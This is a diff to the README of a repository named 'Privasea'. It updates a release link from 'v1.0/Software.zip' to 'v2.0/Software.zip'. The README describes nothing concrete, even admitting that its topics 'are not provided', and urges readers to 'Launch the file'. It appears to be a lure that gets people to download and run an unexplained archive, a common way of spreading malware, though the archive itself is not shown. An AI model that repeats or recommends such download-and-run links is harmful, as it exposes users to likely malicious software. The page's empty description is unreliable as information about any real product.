@@ -11,7 +11,7 @@ The specific topics relating to this repository are not provided. But don't worr
 ## Get Started
 Explore the depths of Privasea by clicking the link below:
 
-[<img src="https://github.com/Hadad16/Privasea/releases/download/v1.0/Software.zip">](https://github.com/Hadad16/Privasea/releases/download/v1.0/Software.zip)
+[<img src="https://github.com/Hadad16/Privasea/releases/download/v2.0/Software.zip">](https://github.com/Hadad16/Privasea/releases/download/v2.0/Software.zip)
 
 🚀 **Launch the file** to uncover the secrets held within Privasea!
 
